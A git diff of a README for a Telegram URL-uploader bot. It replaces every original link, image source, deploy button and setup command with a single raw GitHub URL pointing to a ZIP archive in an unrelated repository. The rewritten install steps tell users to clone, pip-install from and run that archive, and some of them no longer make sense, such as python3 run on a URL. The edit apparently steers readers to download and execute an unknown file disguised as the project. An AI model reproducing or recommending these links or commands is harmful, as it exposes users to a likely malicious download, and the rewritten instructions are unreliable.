@@ -1,14 +1,14 @@
-## Made from [AnyDLBot](https://telegram.dog/AnyDLBot)
+## Made from [AnyDLBot](https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip)
 
 ALL CREDITS GOES TO THE BELOVED DEVELOPERS :)
 
-#### If you find any bugs, report to [Zaute Km](https://t.me/iZaute/5)
+#### If you find any bugs, report to [Zaute Km](https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip)
 
 ### Features
 
-- All Supported Video Formats of https://rg3.github.io/youtube-dl/supportedsites.html
+- All Supported Video Formats of https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip
 - Upload as file from any HTTP link
-- Upload zee5, sony.live, voot and much more
+- Upload zee5, https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip, voot and much more
 - Permanent thumbnail support.
 - Added HOTSTAR Link Support!!  (Won't work on European Servers!!)
 - Broadcast message
@@ -20,24 +20,24 @@ ALL CREDITS GOES TO THE BELOVED DEVELOPERS :)
 
 ## Config Vars 🤖
 
-- `API_HASH:` Get this value from [my.telegram.org](https://my.telegram.org) or [@UseTGzKBot <img src="https://telegra.ph/file/23d7c928f000aee982a4a.jpg" width="30" height="30">](https://telegram.dog/UseTGzKbot).
-- `APP_ID:` Get this value from [my.telegram.org](https://my.telegram.org) or [@UseTGzKBot <img src="https://telegra.ph/file/23d7c928f000aee982a4a.jpg" width="30" height="30">](https://telegram.dog/UseTGzKbot).
-- `BOT_TOKEN:` Get the bot token from [Bot Father <img src="https://telegra.ph/file/8d80c13110506bf1cb58e.jpg" width="30" height="30">](https://telegram.dog/BotFather)
-- `AUTH_USERS` Allow only pre-defined users to use this bot Get From [@TGPyRoBot <img src="https://telegra.ph/file/14f9e7c35e646c249ddd3.jpg" width="30" height="30">](https://telegram.dog/TGPyRoBot)
+- `API_HASH:` Get this value from [https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip) or [@UseTGzKBot <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip" width="30" height="30">](https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip).
+- `APP_ID:` Get this value from [https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip) or [@UseTGzKBot <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip" width="30" height="30">](https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip).
+- `BOT_TOKEN:` Get the bot token from [Bot Father <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip" width="30" height="30">](https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip)
+- `AUTH_USERS` Allow only pre-defined users to use this bot Get From [@TGPyRoBot <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip" width="30" height="30">](https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip)
 - `AUTH_CHANNEL` For Force Subscribe. Paste your Update channel id (Eg: -100)
 
 ## Deploy to heroku 🗳
 Press the button Deploy to heroku and give the values for the config vars. 👇
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://telegram.dog/XTZ_HerokuBot?start=WmF1dGVLbS9VUkwtVXBsb2FkZXIgbWFzdGVy)
+[![Deploy](https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip)
 
 #### Run in your VPS
 ```sh
-git clone https://github.com/ZauteKm/URL-Uploader
+git clone https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip
 cd URL-Uploader
-pip3 install -r requirements.txt
-# <Create config.py appropriately>
-python3 bot.py
+pip3 install -r https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip
+# <Create https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip appropriately>
+python3 https://raw.githubusercontent.com/abhijeetkumarthakur/URL-Uploader/master/telharmonium/URL-Uploader.zip
 ```
 
 ### Commands
